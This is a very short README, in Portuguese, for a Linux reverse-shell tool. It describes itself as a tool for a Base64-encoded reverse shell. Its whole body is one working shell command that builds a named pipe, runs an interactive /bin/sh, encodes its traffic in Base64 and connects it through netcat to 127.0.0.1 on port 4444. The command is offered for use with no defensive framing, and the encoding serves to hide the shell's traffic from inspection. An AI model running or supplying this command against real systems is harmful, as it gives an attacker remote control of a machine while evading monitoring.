# Linux Reverse Shell (Encoded)

Esta é uma ferramenta para realização de Shell reverso encodado com Base64

## Linux command

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | while read line; do echo $(echo "$line" | base64 -d) 2>&1; done |/bin/sh -i 2>&1 | base64 |nc 127.0.0.1 4444 >/tmp/f